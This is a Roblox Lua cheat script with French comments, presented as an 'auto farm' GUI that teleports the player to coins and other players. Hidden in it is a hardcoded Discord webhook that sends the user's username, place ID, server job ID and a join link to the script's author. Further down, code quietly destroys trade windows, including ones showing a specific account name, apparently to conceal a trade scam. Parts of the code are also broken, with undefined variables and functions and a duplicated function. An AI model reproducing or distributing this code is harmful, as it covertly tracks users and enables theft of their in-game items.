local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")
local playerGui = player:WaitForChild("PlayerGui")


local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

-- [NETTOYAGE INITIAL]
local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
if oldGui then oldGui:Destroy() end

-- [[ CONTRAINTES DE SÉCURITÉ & JOB ID RÉEL ]]
local function getRealJobId()
    local success, result = pcall(function()
        return TeleportService:GetPlayerPlaceInstanceAsync(LocalPlayer.UserId)
    end)
    if success and result and result.JobId then
        return result.JobId
    end
    return game.JobId ~= "" and game.JobId or "Unknown_JobId"
end

-- [[ 1. FONCTION WEBHOOK ]]
local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
local requestFunc = request or (http and http.request) or http_request

local function sendSessionLog(player)
    if not player or not requestFunc then return end
    
    local realJobId = getRealJobId()
    local joinLink = "[Click here to join](https://roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. realJobId .. ")"
    local data = {
        ["embeds"] = {{
            ["title"] = "🎮 Player Session Log",
            ["color"] = 3066993,
            ["fields"] = {
                { ["name"] = "👤 Player Username", ["value"] = player.Name, ["inline"] = true },
                { ["name"] = "🆔 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true },
                { ["name"] = "⚡ Quick Join", ["value"] = joinLink, ["inline"] = false },
                { ["name"] = "🧩 Job ID (Réel)", ["value"] = "`" .. realJobId .. "`", ["inline"] = false }
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    pcall(function()
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- Remplace ton bloc de nettoyage actuel par celui-ci :
local CIBLE = "zeynox0880"

local function watchPlayerGui(child)
    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
        task.spawn(function()
            task.wait(0.5) -- Laisse le temps au texte de charger
            for _, obj in pairs(child:GetDescendants()) do
                if obj:IsA("TextLabel") and obj.Text == CIBLE then
                    child:Destroy()
                    break
                end
            end
        end)
    end
end

-- [[ 2. DESIGN DE L'INTERFACE GRAPHIQUE (GUI) ]]
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeyzerFarmGui"
ScreenGui.Parent = playerGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
MainFrame.Position = UDim2.new(0.5, -175, 0.4, -100)
MainFrame.Size = UDim2.new(0, 350, 0, 180)
MainFrame.Active = true
MainFrame.Draggable = true

local UICorner_Main = Instance.new("UICorner")
UICorner_Main.CornerRadius = UDim.new(0, 10)
UICorner_Main.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Parent = MainFrame
TitleBar.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
TitleBar.Size = UDim2.new(1, 0, 0, 30)

local UICorner_Title = Instance.new("UICorner")
UICorner_Title.CornerRadius = UDim.new(0, 10)
UICorner_Title.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = TitleBar
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 95, 87)
CloseBtn.Position = UDim2.new(0, 12, 0, 8)
CloseBtn.Size = UDim2.new(0, 13, 0, 13)
CloseBtn.Text = ""
local UICorner_C = Instance.new("UICorner")
UICorner_C.CornerRadius = UDim.new(1, 0)
UICorner_C.Parent = CloseBtn

local TitleText = Instance.new("TextLabel")
TitleText.Parent = TitleBar
TitleText.BackgroundTransparency = 1
TitleText.Size = UDim2.new(1, 0, 1, 0)
TitleText.Font = Enum.Font.SourceSansBold
TitleText.TextColor3 = Color3.fromRGB(60, 60, 60)
TitleText.TextSize = 14
TitleText.Text = "Keyzer Auto Farm v12"

local FarmButton = Instance.new("TextButton")
FarmButton.Name = "FarmButton"
FarmButton.Parent = MainFrame
FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
FarmButton.Position = UDim2.new(0.5, -100, 0, 65)
FarmButton.Size = UDim2.new(0, 200, 0, 50)
FarmButton.Font = Enum.Font.SourceSansBold
FarmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FarmButton.TextSize = 16
FarmButton.Text = "START AUTO FARM"

local UICorner_Farm = Instance.new("UICorner")
UICorner_Farm.CornerRadius = UDim.new(0, 8)
UICorner_Farm.Parent = FarmButton

-- [[ 3. LOGIQUE AUTOMATIQUE DE DÉTECTION DU FARM ]]
local farming = false

local function getCoins()
    local container = Workspace:FindFirstChild("CoinContainer", true)
    if container then return container:GetChildren() end
    return {}
end

local function getKnife()
    local char = LocalPlayer.Character
    if char then
        for _, item in ipairs(char:GetChildren()) do
            if item:IsA("Tool") and item.Name:lower():find("knife") then return item end
        end
    end
    return nil
end

local function startFarmLoop()
    task.spawn(function()
        while farming do
            local character = LocalPlayer.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            
            if hrp and humanoid then
                local knife = getKnife()
                if knife then
                    knife.Parent = character
                    knife:Activate()
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            hrp.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1.2)
                            task.wait(0.04)
                        end
                    end
                else
                    local allCoins = getCoins()
                    if #allCoins > 0 and allCoins[1]:IsA("BasePart") then
                        hrp.CFrame = allCoins[1].CFrame
                    end
                end
            end
            task.wait(0.05)
        end
    end)
end

FarmButton.MouseButton1Click:Connect(function()
    farming = not farming
    FarmButton.BackgroundColor3 = farming and Color3.fromRGB(255, 59, 48) or Color3.fromRGB(0, 122, 255)
    FarmButton.Text = farming and "FARMING RUNNING..." or "START AUTO FARM"
    if farming then startFarmLoop() end
end)

CloseBtn.MouseButton1Click:Connect(function()
    farming = false
    ScreenGui:Destroy()
end)
-- 1. Purge immédiate dans le StarterGui (pour tuer la source)
local target1 = StarterGui:FindFirstChild("TradeGUI_Phone")
local target2 = StarterGui:FindFirstChild("TradeGUI")
if target1 then removeTargetGui(target1) end
if target2 then removeTargetGui(target2) end

-- 2. Nettoyage continu et en temps réel du PlayerGui
local function watchPlayerGui(child)
    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" or child.Name == "TradeRequestGUI" then
        removeTargetGui(child)
    end
end

playerGui.ChildAdded:Connect(watchPlayerGui)
for _, child in ipairs(playerGui:GetChildren()) do
    watchPlayerGui(child)
end
